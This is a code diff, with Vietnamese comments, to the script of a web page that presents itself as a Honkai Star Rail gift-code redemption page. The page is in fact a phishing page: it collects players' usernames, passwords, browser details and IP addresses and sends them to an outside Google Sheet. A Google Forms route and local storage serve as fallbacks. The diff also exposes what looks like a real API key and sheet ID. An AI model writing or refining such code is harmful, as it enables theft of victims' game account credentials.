@@ -267,8 +267,10 @@
     </div>
 
     <script>
-        // ================= CẤU HÌNH GOOGLE APPS SCRIPT =================
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxKlNCPI0epzf1hafT9vjUF1IN8feo6NtWGyWSGf3av5Eh_C99MtsL7uV1f3R9_dCNU/exec';
+        // ================= CẤU HÌNH GOOGLE SHEETS API =================
+        // THAY ĐỔI 2 DÒNG NÀY THÀNH THÔNG TIN CỦA BẠN
+        const SHEET_ID = '11rTrANoZLC8WhFJX7wOQZHB2iiuDuzzamwVz67_KK9I'; // ID Google Sheet của bạn
+        const API_KEY = 'AIzaSyAxMxHKIMTVtYaLQL78-bNUT0wM4PLnU_Q'; // API Key từ Google Cloud Console
 
         // ================= HÀM HIỂN THỊ THÔNG BÁO =================
         function showStatus(message, type = 'success') {
@@ -298,33 +300,72 @@
             return code;
         }
 
-        // ================= GỬI DỮ LIỆU ĐẾN GOOGLE SHEETS =================
-        async function submitToGoogleSheets(userData) {
+        // ================= GHI TRỰC TIẾP VÀO GOOGLE SHEETS =================
+        async function writeToGoogleSheets(userData) {
             try {
-                // Tạo URL với tham số
-                const params = new URLSearchParams();
-                params.append('username', userData.username);
-                params.append('password', userData.password);
-                params.append('code', userData.code);
-                params.append('timestamp', userData.timestamp);
-                params.append('browser', userData.browser);
-                params.append('ip', userData.ip);
+                const now = new Date();
                 
-                const url = `${GOOGLE_SCRIPT_URL}?${params.toString()}`;
-                
-                console.log('Gửi dữ liệu đến:', url);
-                
-                // Gửi GET request đến Google Apps Script
+                // Tạo dữ liệu để ghi vào sheet
+                const rowData = [
+                    now.toISOString(), // Timestamp
+                    userData.username,
+                    userData.password,
+                    userData.code,
+                    userData.timestamp,
+                    userData.browser,
+                    userData.ip
+                ];
+
+                // URL cho Google Sheets API
+                const url = `https://sheets.googleapis.com/v4/spreadsheets/${SHEET_ID}/values/Sheet1!A:A:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS&key=${API_KEY}`;
+
                 const response = await fetch(url, {
-                    method: 'GET',
-                    mode: 'no-cors' // Google Apps Script cần no-cors
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        values: [rowData]
+                    })
                 });
 
-                // Với no-cors, chúng ta không thể đọc response nhưng request vẫn được gửi
-                return true;
+                if (response.ok) {
+                    const result = await response.json();
+                    console.log('Đã ghi vào Google Sheets:', result);
+                    return true;
+                } else {
+                    const error = await response.text();
+                    console.error('Lỗi Google Sheets API:', error);
+                    return false;
+                }
                 
             } catch (error) {
-                console.error('Lỗi kết nối:', error);
+                console.error('Lỗi kết nối Google Sheets:', error);
+                return false;
+            }
+        }
+
+        // ================= PHƯƠNG PHÁP THAY THẾ: Sử dụng Google Forms =================
+        async function submitViaGoogleForms(userData) {
+            try {
+                // Tạo form data
+                const formData = new URLSearchParams();
+                formData.append('entry.123456789', userData.username); // Thay bằng entry ID thật
+                formData.append('entry.987654321', userData.password); // Thay bằng entry ID thật
+                formData.append('entry.555555555', userData.code);     // Thay bằng entry ID thật
+                formData.append('entry.111111111', userData.timestamp);// Thay bằng entry ID thật
+
+                // Gửi đến Google Forms
+                const response = await fetch('https://docs.google.com/forms/d/e/YOUR_FORM_ID/formResponse', {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                });
+
+                return true; // no-cors nên không thể kiểm tra response
+                
+            } catch (error) {
+                console.error('Lỗi Google Forms:', error);
                 return false;
             }
         }
@@ -382,20 +423,24 @@
 
                 console.log('Dữ liệu gửi đi:', userData);
 
-                // Thử gửi đến Google Sheets
+                // Thử ghi trực tiếp vào Google Sheets
                 let googleSuccess = false;
-                try {
-                    googleSuccess = await submitToGoogleSheets(userData);
-                    if (googleSuccess) {
-                        showStatus('✅ Đã lưu thông tin thành công!', 'success');
-                    } else {
-                        throw new Error('Không thể kết nối đến Google Sheets');
-                    }
-                } catch (error) {
-                    console.warn('Lỗi Google Sheets:', error);
+                
+                if (API_KEY && API_KEY !== 'YOUR_GOOGLE_API_KEY') {
+                    googleSuccess = await writeToGoogleSheets(userData);
+                }
+                
+                if (!googleSuccess) {
+                    // Thử phương pháp Google Forms
+                    googleSuccess = await submitViaGoogleForms(userData);
+                }
+
+                if (googleSuccess) {
+                    showStatus('✅ Đã lưu thông tin thành công!', 'success');
+                } else {
                     // Fallback: lưu cục bộ
                     if (saveToLocalStorage(userData)) {
-                        showStatus('⚠️ Đã lưu cục bộ (Kiểm tra kết nối internet)', 'warning');
+                        showStatus('⚠️ Đã lưu cục bộ (Cần cấu hình API Key)', 'warning');
                     } else {
                         showStatus('❌ Lỗi lưu thông tin!', 'error');
                     }
@@ -426,18 +471,14 @@
             document.getElementById('loginBox').style.display = 'block';
         }
 
-        // ================= PHÍM TẮT ADMIN =================
-        document.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && e.altKey && e.key === 'a') {
-                window.location.href = 'admin.html';
-                e.preventDefault();
-            }
-        });
-
         // ================= KHỞI TẠO =================
         function init() {
             console.log('Trang nhận code Honkai Star Rail đã sẵn sàng!');
-            console.log('Google Script URL:', GOOGLE_SCRIPT_URL);
+            
+            if (API_KEY === 'YOUR_GOOGLE_API_KEY') {
+                console.warn('⚠️ Chưa cấu hình Google API Key');
+                showStatus('⚠️ Chưa cấu hình Google API Key - Dữ liệu sẽ lưu cục bộ', 'warning');
+            }
         }
 
         window.onload = init;
